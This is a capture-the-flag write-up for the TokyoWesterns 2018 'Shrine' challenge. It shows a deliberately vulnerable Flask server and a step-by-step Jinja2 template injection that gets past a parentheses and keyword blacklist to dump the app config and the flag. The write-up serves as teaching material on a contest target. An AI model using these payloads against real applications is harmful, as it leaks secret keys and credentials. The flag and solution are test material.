---
title: Shrine 
contest: TokyoWesterns CTF 4th 2018
authors: trupples
layout: writeup
---

## Proof of Flag
```
TWCTF{pray_f0r_sacred_jinja2}
```

## Summary
Traversing flask global context to find a reference to the app config and get the flag.

## Proof of Solving
Server code:
{% raw %}
```py
import flask
import os


app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```
{% endraw %}

This basically sends our input to the jinja template engine. We can send a
payload enclosed by double curly braces for it to be interpreted as python code.
The only problem is that we are not allowed to directly access the `config` and
`self` objects which would give us the flag immediately and we cannot use
parantheses, so no function calls.



### Solution
My plan was to look through the objects we do have access to in order to find
some “reference chain” that will get us to the `config` object. The environment
is extremely bare, we don’t even have python builtins available, so our only
chance is accessing attributes of objects.

The two objects we can use are `g` - the global app context, and `request` - the
current request object.

I ended up using `g`. The main thing to notice here is that if I simply send
`{{ g }}` as a payload the output is `<flask.g of 'app'>`. This is important
because it means that the app name is visible to `g`, so most probably the whole
app object also is.

The documentation out there isn’t that good, so I had to “dive in” the flask
source code. The `g` object has the class `_AppCtxGlobals` and that is defined
over here:

https://github.com/pallets/flask/blob/master/flask/ctx.py

The `<flask.g of 'app'>` string is created by the `g.__repr__` method:

```py
   def __repr__(self):
        top = _app_ctx_stack.top
        if top is not None:
            return '<flask.g of %r>' % top.app.name
        return object.__repr__(self)
```

We can see that the method looks up the name in `_app_ctx_stack.top.app`. The
`_app_ctx_stack` variable isn’t exposed to us directly but there is a workaround
we can do to access it. Because the `__repr__` method is able to access
`_app_ctx_stack` it needs to have a reference to it in its object (everything is
an object in python, even functions and methods). Let’s take a look at what
attributes we can use from the method (they should be listed in the `__dict__`
attribute):

`http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7B%20g.__repr__.__dict__%20%7D%7D`

```
{}
```

Oh, there’s nothing there. We actually need to take a look at the method’s class
dict to see the attributes that all methods have:

`http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7B%20g.__repr__.__class__.__dict__%20%7D%7D`

```
{'__repr__': <slot wrapper '__repr__' of 'method' objects>, '__hash__': <slot
wrapper '__hash__' of 'method' objects>, '__call__': <slot wrapper '__call__' of
'method' objects>, '__getattribute__': <slot wrapper '__getattribute__' of
'method' objects>, '__setattr__': <slot wrapper '__setattr__' of 'method'
objects>, '__delattr__': <slot wrapper '__delattr__' of 'method' objects>,
'__lt__': <slot wrapper '__lt__' of 'method' objects>, '__le__': <slot wrapper
'__le__' of 'method' objects>, '__eq__': <slot wrapper '__eq__' of 'method'
objects>, '__ne__': <slot wrapper '__ne__' of 'method' objects>, '__gt__': <slot
wrapper '__gt__' of 'method' objects>, '__ge__': <slot wrapper '__ge__' of
'method' objects>, '__get__': <slot wrapper '__get__' of 'method' objects>,
'__new__': <built-in method __new__ of type object at 0x7fdc2b3c5ee0>,
'__reduce__': <method '__reduce__' of 'method' objects>,

!!! THIS !!!
'__func__': <member '__func__' of 'method' objects>,

'__self__': <member '__self__' of 'method' objects>, '__doc__': <attribute
'__doc__' of 'method' objects>}
```

The `__func__` attribute will give us the function that gets run by the method
(a method is a function plus a reference to the class it belongs, i think).
Let’s take a look at what we can do with `__func__`:

`http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7B%20g.__repr__.__func__.__class__.__dict__%20%7D%7D`

```
{'__repr__': <slot wrapper '__repr__' of 'function' objects>, '__call__': <slot
wrapper '__call__' of 'function' objects>, '__get__': <slot wrapper '__get__' of
'function' objects>, '__new__': <built-in method __new__ of type object at
0x5562fb698de0>, '__closure__': <member '__closure__' of 'function' objects>,
'__doc__': <member '__doc__' of 'function' objects>,

!!! THIS !!!
'__globals__': <member '__globals__' of 'function' objects>,

'__module__': <member '__module__' of 'function' objects>, '__code__':
<attribute '__code__' of 'function' objects>, '__defaults__': <attribute
'__defaults__' of 'function' objects>, '__kwdefaults__': <attribute
'__kwdefaults__' of 'function' objects>, '__annotations__': <attribute
'__annotations__' of 'function' objects>, '__dict__': <attribute '__dict__' of
'function' objects>, '__name__': <attribute '__name__' of 'function' objects>,
'__qualname__': <attribute '__qualname__' of 'function' objects>}
```

YESSS! We can get a list of the global variables used by the function with:

`http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7B%20g.__repr__.__func__.__globals__%20%7D%7D`

The output is quite large but here’s the bit we’re interested in:

```
{..., '_app_ctx_stack': <werkzeug.local.LocalStack object at 0x7fe74fc7f128>, ...}
```

We have access to `_app_ctx_stack`! This is awesome. We can now access
`_app_ctx_stack.top.app.config` to get the presumably “deleted” config object:

`http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7B%20g.__repr__.__func__.__globals__._app_ctx_stack.top.app.config%20%7D%7D`

At the end of the response we can see the flag:

```
... , 'FLAG': 'TWCTF{pray_f0r_sacred_jinja2}'}>
```
